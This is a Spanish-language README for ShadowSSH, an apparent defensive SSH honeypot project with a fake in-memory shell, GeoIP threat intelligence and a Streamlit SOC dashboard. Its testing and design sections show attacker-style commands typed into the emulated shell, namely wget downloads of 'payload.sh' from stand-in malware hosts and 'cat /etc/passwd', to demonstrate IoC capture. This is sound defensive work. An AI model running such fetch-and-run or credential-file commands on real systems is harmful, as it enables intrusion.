# 🛡️ ShadowSSH: SSH Honeypot & Threat Intelligence SOC Dashboard

[![Docker](https://img.shields.io/badge/Docker-Compose-blue?logo=docker&logoColor=white)](#)
[![Python](https://img.shields.io/badge/Python-3.11-yellow?logo=python&logoColor=white)](#)
[![Streamlit](https://img.shields.io/badge/Dashboard-Streamlit-red?logo=streamlit&logoColor=white)](#)
[![Security](https://img.shields.io/badge/Blue_Team-Threat_Intel-green?logo=hackthebox&logoColor=white)](#)

**ShadowSSH** es un Honeypot SSH de interacción media diseñado con arquitectura defensiva (Blue Team) para capturar ataques de fuerza bruta, registrar credenciales comprometidas y emular una terminal Linux interactiva (*fake shell*) **sin poner en riesgo el sistema operativo anfitrión**.

Incluye un módulo de **Threat Intelligence (GeoIP)** y un **Dashboard de SOC en tiempo real** para visualizar el origen geográfico de los ataques y los Indicadores de Compromiso (**IoCs**).

---

## 🏗️ Arquitectura del Sistema

```mermaid
flowchart TD
    subgraph External["🌐 Internet Externa"]
        Attacker["👤 Atacante / Botnet<br/><i>(Tráfico Malicioso & Fuerza Bruta)</i>"]
    end

    subgraph Docker["🐳 Entorno Contenedorizado (Docker Compose)"]
        subgraph HoneypotContainer["🛡️ Contenedor Honeypot (Puerto 2222)"]
            SSHServer["Servidor SSH (Paramiko Engine)<br/><i>Handshake y Llaves RSA Dinámicas</i>"]
            AuthCheck{"Verificación de<br/>Credenciales"}
            FakeShell["Terminal Emulada en Memoria<br/><i>Sandbox 100% Aislado (Sin acceso a OS)</i>"]
            IoCCapture["Extractor de IoCs<br/><i>Captura URLs, payloads y comandos</i>"]
        end

        subgraph IntelLayer["🧠 Enriquecimiento & Persistencia"]
            GeoIP["Módulo Threat Intel<br/><i>GeoIP, ISP y Coordenadas Lat/Lon</i>"]
            DB[("Base de Datos SQLite<br/><i>(Volumen Compartido Docker)</i>")]
        end

        subgraph SOCContainer["📊 Contenedor SOC Dashboard (Puerto 8501)"]
            Dashboard["Streamlit SOC Dashboard<br/><i>Mapas de Calor, KPIs y Logs Forenses</i>"]
        end
    end

    subgraph DefenseTeam["🛡️ Monitoreo Defensivo"]
        Analyst["👨‍💻 Analista Blue Team / Reclutador"]
    end

    %% Conexiones de flujo
    Attacker -->|"1. Conexión SSH :2222"| SSHServer
    SSHServer -->|"2. Intento Login"| AuthCheck
    AuthCheck -->|"Credencial Trap (root/admin)"| FakeShell
    AuthCheck -->|"Resolución IP"| GeoIP
    FakeShell -->|"3. Ejecución de comandos"| IoCCapture
    IoCCapture -->|"4. Registro de Comandos"| DB
    GeoIP -->|"5. Almacena Telemetría"| DB
    DB -->|"6. Lectura en tiempo real"| Dashboard
    Dashboard -->|"7. Visualización y Análisis"| Analyst

    %% Estilos visuales
    classDef external fill:#b91c1c,stroke:#7f1d1d,stroke-width:2px,color:#ffffff;
    classDef container fill:#0f172a,stroke:#38bdf8,stroke-width:2px,color:#f8fafc;
    classDef db fill:#065f46,stroke:#047857,stroke-width:2px,color:#ffffff;
    classDef analyst fill:#1e40af,stroke:#1d4ed8,stroke-width:2px,color:#ffffff;

    class Attacker external;
    class SSHServer,AuthCheck,FakeShell,IoCCapture,GeoIP,Dashboard container;
    class DB db;
    class Analyst analyst;
```

---

## 🔒 Decisiones de Diseño de Seguridad

* **Principio de Mínimo Privilegio & Aislamiento:** Ningún comando tecleado por el atacante se envía a `/bin/bash` ni a `subprocess`. La terminal es un emulador en memoria (`fake_shell.py`) que responde sintéticamente a comandos típicos (`id`, `whoami`, `cat /etc/passwd`, `wget`).
* **Captura de IoCs:** Si un atacante intenta descargar malware vía `wget http://malware.com/script.sh`, el honeypot simula una descarga exitosa, engaña al atacante y guarda la URL en el registro forense.
* **Aislamiento por Contenedores:** Corre en contenedores Docker independientes comunicados por una red privada.

---

## 🚀 Despliegue Rápido con Docker (1 Paso)

Requisitos: Tener instalado **Docker** y **Docker Compose**.

```bash
# 1. Clonar el repositorio y entrar a la carpeta
cd ssh-honeypot-dashboard

# 2. Levantar el Honeypot y el Dashboard SOC
docker compose up --build
```

* 🛡️ **Honeypot SSH:** Escuchando en `localhost:2222`
* 📊 **Dashboard SOC:** Abre tu navegador en **`http://localhost:8501`**

---

## 🧪 Pruebas y Simulación de Ataques

### Opción A: Probar como un atacante real desde tu terminal
Conéctate por SSH al puerto 2222:
```bash
ssh root@localhost -p 2222
```
* Ingresa la contraseña trampa: `root` o `123456`.
* Verás la bienvenida de Ubuntu. Prueba teclear:
  ```bash
  whoami
  id
  uname -a
  cat /etc/passwd
  wget http://malware-site.test/payload.sh
  exit
  ```
* Revisa inmediatamente el Dashboard (`http://localhost:8501`) para ver tu sesión registrada en vivo.

### Opción B: Inyectar tráfico de ataque simulado (Botnets globales)
Para llenar el mapa y las estadísticas con decenas de ataques de prueba simulando botnets de varios países:
```bash
python simulate_attacks.py
```

---

## 📂 Estructura del Código

```text
ssh-honeypot-dashboard/
├── honeypot/
│   ├── server.py         # Servidor SSH multihilo y gestión de sesiones
│   ├── fake_shell.py     # Emulador seguro de terminal en memoria
│   ├── database.py       # Capa de persistencia SQLite
│   └── threat_intel.py   # Módulo GeoIP y resolución de red
├── dashboard/
│   └── app.py            # Dashboard visual SOC en Streamlit
├── simulate_attacks.py   # Inyector de telemetría y pruebas
├── Dockerfile.honeypot   # Contenedor del sensor Honeypot
├── Dockerfile.dashboard  # Contenedor del SOC Dashboard
├── docker-compose.yml    # Orquestación de servicios
├── requirements.txt      # Dependencias Python
└── README.md             # Documentación técnica
```
